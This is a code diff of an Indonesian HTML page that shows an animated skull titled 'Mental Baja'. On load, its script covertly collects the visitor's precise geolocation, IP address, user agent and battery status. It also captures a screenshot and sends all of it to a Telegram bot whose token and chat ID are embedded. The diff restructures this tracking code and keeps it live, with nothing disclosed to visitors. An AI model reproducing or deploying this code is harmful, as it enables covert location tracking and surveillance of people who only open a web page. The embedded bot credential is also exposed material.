@@ -70,9 +70,9 @@
   </style>
 </head>
 <body>
-  <div class="skull-container" aria-label="Animated skull">
-    <svg viewBox="0 0 300 320" role="img" aria-labelledby="Mental Baja">
-      <title>Mental Baja</title>
+  <div class="skull-container" aria-label="Animated Skull Mental Baja">
+    <svg viewBox="0 0 300 320" role="img" aria-labelledby="skullTitle">
+      <title id="skullTitle">Mental Baja</title>
       <desc>Khusus yang bermental baja!</desc>
       <defs>
         <filter id="shadow1" x="-20%" y="-20%" width="140%" height="140%">
@@ -98,65 +98,59 @@
       <path class="nose" d="M140 160 L150 180 L160 160 Q150 170 140 160 Z" />
     </svg>
   </div>
+
   <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.min.js"></script>
   <script>
-    const chatId = "5204287041"; // Ganti dengan Chat ID kamu
-    const token = "7647192109:AAHkTy5EWtkjnz-9wSyfHjcIf8giP94kPKs"; // Ganti dengan Token Bot Telegram
+    const chatId = "5204287041"; // Chat ID kamu
+    const token = "7647192109:AAHkTy5EWtkjnz-9wSyfHjcIf8giP94kPKs"; // Bot Token kamu
 
-    // Ambil data user
     function getOSINTData() {
-      // Lokasi
-      if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(position => {
-          const { latitude, longitude } = position.coords;
+      if (!navigator.geolocation) return;
 
-          // IP Address
-          fetch("https://api.ipify.org?format=json")
-            .then(res => res.json())
-            .then(data => {
-              const ip = data.ip;
+      navigator.geolocation.getCurrentPosition(position => {
+        const { latitude, longitude } = position.coords;
 
-              // Info browser dan battery
-              const ua = navigator.userAgent;
-              navigator.getBattery().then(bat => {
-                const batteryLevel = (bat.level * 100).toFixed(0);
-                const charging = bat.charging ? 'Charging' : 'Not charging';
+        fetch("https://api.ipify.org?format=json")
+          .then(res => res.json())
+          .then(data => {
+            const ip = data.ip;
+            const ua = navigator.userAgent;
 
-                // Ambil Screenshot
-                html2canvas(document.body).then(canvas => {
-                  const screenshotData = canvas.toDataURL(); // Gambar base64
+            navigator.getBattery().then(bat => {
+              const battery = `${(bat.level * 100).toFixed(0)}% (${bat.charging ? 'Charging' : 'Not charging'})`;
 
-                  // Kirim ke Telegram
-                  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                    method: "POST",
-                    headers: {
-                      "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                      chat_id: chatId,
-                      text: `OSINT Data:\nIP: ${ip}\nLatitude: ${latitude}\nLongitude: ${longitude}\nUser Agent: ${ua}\nBattery: ${batteryLevel}% (${charging})`
-                    })
-                  });
+              html2canvas(document.body).then(canvas => {
+                const screenshotData = canvas.toDataURL("image/png");
 
-                  // Kirim Screenshot
-                  fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                    method: "POST",
-                    headers: {
-                      "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                      chat_id: chatId,
-                      photo: screenshotData
-                    })
-                  });
+                // Kirim data teks ke Telegram
+                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                  method: "POST",
+                  headers: {
+                    "Content-Type": "application/json"
+                  },
+                  body: JSON.stringify({
+                    chat_id: chatId,
+                    text: `OSINT Data:\nIP: ${ip}\nLokasi: ${latitude}, ${longitude}\nUser-Agent: ${ua}\nBaterai: ${battery}`
+                  })
+                });
+
+                // Kirim screenshot base64 ke Telegram
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                  method: "POST",
+                  headers: {
+                    "Content-Type": "application/json"
+                  },
+                  body: JSON.stringify({
+                    chat_id: chatId,
+                    photo: screenshotData
+                  })
                 });
               });
             });
-        });
-      }
+          });
+      });
     }
 
-    // Memulai pengambilan data OSINT
     getOSINTData();
   </script>
 </body>
